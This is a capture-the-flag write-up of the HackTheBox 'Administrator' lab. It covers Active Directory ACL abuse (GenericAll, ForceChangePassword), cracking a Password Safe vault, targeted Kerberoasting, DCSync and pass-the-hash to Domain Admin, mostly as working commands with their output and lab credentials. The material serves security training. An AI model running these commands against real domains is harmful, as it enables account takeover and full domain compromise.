---
title: "HTB - Administrator (Medium | Windows | Active Directory)"
date: 2026-09-16 13:00:00 +0000
categories: [HackTheBox, Active Directory]
tags: [htb, windows, active-directory, ftp, bloodhound, genericall, bloodyad, forcechangepassword, pwsafe2john, john, evil-winrm, kerberoasting, dcsync-attack, password-safe, secretsdump, getuserspns]
description: "Chain AD ACL abuse (GenericAll & ForceChangePassword), crack a Password Safe vault, then Kerberoast & DCSync to Domain Admin"
image:
  path: /assets/img/administrator.png
---

## **Recon**

```bash
nmap -p- -sSCV --open --min-rate 5000 <target>
```

```
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-17 02:50:46Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
50499/tcp open  msrpc         Microsoft Windows RPC
50504/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
50509/tcp open  msrpc         Microsoft Windows RPC
50512/tcp open  msrpc         Microsoft Windows RPC
50529/tcp open  msrpc         Microsoft Windows RPC
50561/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-09-17T02:51:52
|_  start_date: N/A
|_clock-skew: 7h00m00s
```

### Service Discovery Analysis

The Nmap scan reveals multiple critical services running on the target machine:

- **FTP (Port 21):** Microsoft ftpd - notably open and accessible
- **DNS (Port 53):** Simple DNS Plus
- **Kerberos (Port 88):** Microsoft Windows Kerberos
- **SMB (Port 139, 445):** Microsoft Windows file sharing with message signing required
- **LDAP (Port 389, 636, 3268, 3269):** Active Directory LDAP services
- **RPC (Port 135, 593):** Various RPC endpoints
- **WinRM (Port 5985, 47001):** Windows Remote Management services
- **RPC Services (Ports 49664-49668, 50499, 50504, 50509, 50512, 50529, 50561):** Multiple RPC endpoints

The domain is identified as administrator.htb with hostname DC. The presence of FTP is a notable attack vector.

### Kerberos Configuration

Generate krb5.conf file for Kerberos-based authentication:

```bash
faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \
netexec smb dc.administrator.htb -u 'Olivia' -p 'ichliebedich' -d administrator.htb -k --generate-krb5-file administrator.krb5
```

Create the krb5.conf file:

```bash
echo '[libdefaults]
    dns_lookup_kdc = false
    dns_lookup_realm = false
    default_realm = ADMINISTRATOR.HTB

[realms]
    ADMINISTRATOR.HTB = {
        kdc = dc.administrator.htb
        admin_server = dc.administrator.htb
        default_domain = administrator.htb
    }

[domain_realm]
    .administrator.htb = ADMINISTRATOR.HTB
    administrator.htb = ADMINISTRATOR.HTB' | sudo tee /etc/krb5.conf
```

### BloodHound Data Collection

Collect Active Directory information using BloodHound Python with Kerberos authentication:

```bash
faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \ 
bloodhound-python -d administrator.htb -u Olivia -p 'ichliebedich' -k -c All -ns <target> --zip
```

---

## **User**

### GenericAll Privilege Exploitation

![](/assets/img/administrator/Pasted_image_20260916180846.png)

BloodHound analysis reveals that Olivia has GenericAll privileges over the Michael user. This allows us to modify Michael's account properties and change his password.

#### Step 1: Add GenericAll to Michael

Ensure Olivia has GenericAll privileges over Michael:

```bash
faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \ 
bloodyAD -H <target> -d "administrator.htb" -u "olivia" -p "ichliebedich" add genericAll "michael" "olivia"

[+] olivia has now GenericAll on michael
```

#### Step 2: Change Michael's Password

Change Michael's password using the GenericAll privilege:

```bash
faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \ 
bloodyAD -H <target> -d "administrator.htb" -u "olivia" -p "ichliebedich" set password "michael" "NewPassword123@@@"

[+] Password changed successfully!
```

### ForceChangePassword Privilege Chain

BloodHound analysis reveals that Michael has ForceChangePassword privilege over Benjamin:

![](/assets/img/administrator/Pasted_image_20260916172352.png)

#### Step 3: Change Benjamin's Password

Use Michael's credentials to change Benjamin's password:

```bash
faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \ 
bloodyAD -H <target> -d "administrator.htb" -u "michael" -p "NewPassword123@@@" set password "benjamin" "BenjaminNewPassword123@@@"

[+] Password changed successfully!
```

### FTP Enumeration

Despite Benjamin being a member of Share Moderators group, we pivot to enumerating the FTP service discovered on port 21, which is notable as an open service in this environment.

Discover a PasswordSafe backup file on the FTP server:

![](/assets/img/administrator/Pasted_image_20260916173214.png)

A file named Backup.psafe3 (PasswordSafe database) is discovered on the FTP server.

#### Step 4: Crack the Psafe file

Download the encrypted PasswordSafe file and crack its password:

```bash
pwsafe2john Backup.psafe3 > hash.txt

john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

tekieromucho     (Backu)  
```

![](/assets/img/administrator/Pasted_image_20260916173518.png)

**PasswordSafe Master Password:** `tekieromucho`

#### Step 5: Extract Credentials from PasswordSafe

Open the PasswordSafe database and extract stored credentials:

![](/assets/img/administrator/Pasted_image_20260916174330.png)

Multiple credentials are extracted from the PasswordSafe database, including credentials for Emily with password `UXLCI5iETUsIBoFVTj8yQFKoHjXmb`.

#### Step 6: Authenticate as Emily

Connect via WinRM using Emily's extracted credentials:

```bash
evil-winrm -i <target> -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
```

![](/assets/img/administrator/Pasted_image_20260916174736.png)

An interactive PowerShell session is established as Emily user.

---

## **Root**

### Targeted Kerberoasting Attack

BloodHound analysis reveals that Emily has GenericWrite privilege over the Ethan user:

![](/assets/img/administrator/Pasted_image_20260916175418.png)

GenericWrite can be exploited to add a Service Principal Name (SPN) to the target user, enabling Kerberoasting.

#### Step 1: Add SPN to Ethan

Add an SPN to Ethan's account using Emily's GenericWrite privilege:

```bash
faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \
bloodyAD --host <target> -d administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' set object ethan servicePrincipalName -v 'HTTP/FakeService'

[+] ethan's servicePrincipalName has been updated
```

#### Step 2: Request Kerberos TGS Ticket

Request a Service Ticket for the newly added SPN:

```bash
faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \
impacket-GetUserSPNs 'administrator.htb/emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb' -dc-ip <target> -request-user ethan -outputfile hashes.kerberoast
```

![](/assets/img/administrator/Pasted_image_20260916175657.png)

A Kerberos TGS ticket is extracted for offline cracking.

#### Step 3: Crack Kerberos Hash

Use John the Ripper to crack the extracted Kerberos hash:

```bash
john hashes.kerberoast --wordlist=/usr/share/wordlists/rockyou.txt
limpbizkit       (?)
```

![](/assets/img/administrator/Pasted_image_20260916175628.png)

ethan password:** `limpbizkit`

### DCSync Attack

BloodHound analysis reveals that Ethan has DCSync privileges over the domain:

![](/assets/img/administrator/Pasted_image_20260916175811.png)

DCSync privilege allows querying the domain controller for all user credentials.

#### Step 4: Perform DCSync Attack

Execute a DCSync attack to extract all domain hashes, particularly the Administrator hash:

```bash
faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \
secretsdump.py -k -dc-ip <target> 'administrator.htb/ethan:limpbizkit@dc.administrator.htb' -just-dc

Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e
```

![](/assets/img/administrator/Pasted_image_20260916180228.png)

The Administrator's NTLM hash is successfully extracted: `3dc553ce4b9fd20bd016e098d2d2fd2e`

#### Step 5: Establish Administrator Session

Connect as Administrator using the extracted NTLM hash via pass-the-hash:

```bash
evil-winrm -i <target> -u Administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
```

#### Step 6: Retrieve Root Flag

Capture the root.txt flag:

![](/assets/img/administrator/Pasted_image_20260916180359.png)

Full domain compromise with Administrator access has been achieved.

---

### Attack Chain Summary

1. **Reconnaissance:** Nmap identified Active Directory infrastructure with unusual FTP service open on port 21
2. **BloodHound Collection:** Gathered AD structure and identified privilege escalation chain through Olivia
3. **GenericAll Exploitation:** Used Olivia's GenericAll privilege over Michael to change his password
4. **ForceChangePassword Chain:** Leveraged Michael's ForceChangePassword privilege over Benjamin
5. **FTP Enumeration:** Discovered PasswordSafe database backup on FTP server
6. **PasswordSafe Cracking:** Extracted and cracked PasswordSafe master password using pwsafe2john and John the Ripper
7. **Credential Extraction:** Obtained multiple credentials from PasswordSafe including Emily's password
8. **WinRM Access:** Established initial shell as Emily user via WinRM
9. **GenericWrite Exploitation:** Used Emily's GenericWrite privilege over Ethan to add malicious SPN
10. **Targeted Kerberoasting:** Requested and cracked Kerberos TGS ticket for Ethan
11. **DCSync Privilege Abuse:** Leveraged Ethan's DCSync privilege to extract Administrator hash
12. **Pass-the-Hash:** Authenticated as Administrator using extracted NTLM hash
13. **Full Compromise:** Achieved Administrator access and retrieved root flag